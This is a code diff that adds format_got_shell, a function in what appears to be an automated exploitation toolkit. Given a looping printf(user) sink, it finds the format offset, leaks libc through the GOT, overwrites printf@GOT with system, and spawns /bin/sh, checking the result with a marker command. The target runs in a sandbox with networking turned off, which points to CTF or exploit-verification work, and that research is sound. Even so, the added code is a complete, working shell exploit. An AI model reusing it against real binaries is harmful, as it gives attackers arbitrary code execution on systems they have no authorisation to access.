@@ -674,6 +674,92 @@ def orw_leak(exe, workdir, *, offset, pop_rdi, pop_rsi, pop_rdx, puts_plt, puts_
     return {"ok": False, "reason": "ORW chain did not disclose the flag", "base": None}
 
 
+def format_got_shell(exe, workdir, *, got_slot, system_off, leak_got=None, leak_off=None,
+                     base_argv=(), timeout: float = 8.0, mem_mb: int = 2048,
+                     marker: bytes = b"LYKOS-FMT-9931") -> dict:
+    """Auto format-string -> shell for a LOOPING printf(user) sink (no-PIE, writable GOT). In one
+    process: (1) recover the format argument offset, (2) leak the libc address in `got_slot` with a
+    DETERMINISTIC `%N$s` read (base = leaked - `sym_off`; no %p-dump classification, which a stack
+    rarely satisfies), (3) %hhn-overwrite `got_slot` (the sink's own printf@GOT) with system, (4)
+    send "/bin/sh" so the loop's next printf(buf) becomes system("/bin/sh"). Confirmed by a spawned
+    shell EVALUATING the marker (not an echo). No analyst config and no win function -- the write
+    target and value are both auto-derived. Only a LOOPING sink reaches it: a single-shot sink cannot
+    both leak and write."""
+    from . import attribution, fmt
+    markers = attribution.make_code_markers()
+    exedir = str(Path(exe).resolve().parent)
+    argv = [str(a) for a in base_argv]
+    # Leak a DIFFERENT GOT slot than the one we overwrite: a %s reads until a NUL, so the leaked
+    # function's address must not start with 0x00 -- and a page-aligned-offset function (printf,
+    # whose offset ends in 000) does exactly that. The caller picks a leak fn with a non-zero low
+    # byte; default to the overwrite target only as a fallback.
+    lg = leak_got if leak_got is not None else got_slot
+    lo = leak_off if leak_off is not None else system_off
+
+    for _ in range(3):
+        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
+        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
+        try:
+            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                 stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
+                                 preexec_fn=preexec)
+        except Exception as e:                               # noqa: BLE001
+            return {"ok": False, "reason": f"spawn failed: {e!r}"}
+        try:
+            _read_until(p, time.time() + 0.5)
+            # 1) argument offset where the format buffer lands
+            try:
+                p.stdin.write(fmt.probe_payload(count=30)); p.stdin.flush()
+            except (BrokenPipeError, OSError):
+                continue
+            arg_off = fmt.find_fmt_offset(_read_until(p, time.time() + timeout / 3))
+            if not arg_off:
+                continue
+            # 2) leak the libc address in the leak GOT slot via a deterministic positional %s
+            try:
+                p.stdin.write(fmt.read_at_payload(arg_off, lg)); p.stdin.flush()
+            except (BrokenPipeError, OSError):
+                continue
+            dump = _read_until(p, time.time() + timeout / 3)
+            raw = dump[:6]                                # %s prints the deref'd string FIRST
+            if len(raw) < 6:
+                continue
+            base = int.from_bytes(raw.ljust(8, b"\x00"), "little") - lo
+            if base <= 0 or (base & 0xFFF):              # not page-aligned -> wrong leak, retry
+                continue
+            # 3) overwrite the sink's printf@GOT with system
+            try:
+                p.stdin.write(fmt.fmtstr_payload(arg_off, {got_slot: base + system_off}))
+                p.stdin.flush()
+            except (BrokenPipeError, OSError):
+                continue
+            _read_until(p, time.time() + timeout / 3)
+            # 4) next printf(buf) == system(buf): hand it "/bin/sh", then drive the shell
+            try:
+                p.stdin.write(b"/bin/sh\x00"); p.stdin.flush()
+                time.sleep(0.3)
+                p.stdin.write(markers.command + b"\n"); p.stdin.flush()
+            except (BrokenPipeError, OSError):
+                continue
+            out = _read_until(p, time.time() + timeout, quiet=1.5)
+            if markers.proves(out):
+                return {"ok": True, "base": base, "system": base + system_off, "arg_offset": arg_off,
+                        "output": out[:400].decode("latin-1", "ignore")}
+        finally:
+            for s in (p.stdin, p.stdout):
+                try:
+                    if s is not None:
+                        s.close()
+                except Exception:                            # noqa: BLE001
+                    pass
+            _kill(p)
+            try:
+                p.wait(timeout=2)
+            except Exception:                                # noqa: BLE001
+                pass
+    return {"ok": False, "reason": "format GOT->system did not spawn a shell", "base": None}
+
+
 def discover_canary_offset(exe, workdir, *, canary_trigger=b"", base_argv=(), timeout: float = 8.0,
                            mem_mb: int = 2048, lo: int = 8, hi: int = 400):
     """Auto-recover the overflow distance to the STACK CANARY by binary-searching the payload length
